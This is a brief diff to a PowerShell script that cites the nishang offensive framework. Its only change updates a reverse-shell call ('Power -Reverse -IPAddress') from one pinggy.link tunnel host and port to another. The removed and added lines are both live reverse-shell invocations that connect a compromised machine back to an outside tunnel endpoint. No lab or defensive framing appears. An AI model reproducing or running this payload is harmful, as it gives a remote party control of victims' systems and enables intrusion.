@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Power -Reverse -IPAddress rndyv-115-187-63-71.a.free.pinggy.link -Port 33603
+Power -Reverse -IPAddress rners-115-187-63-71.a.free.pinggy.link -Port 39579
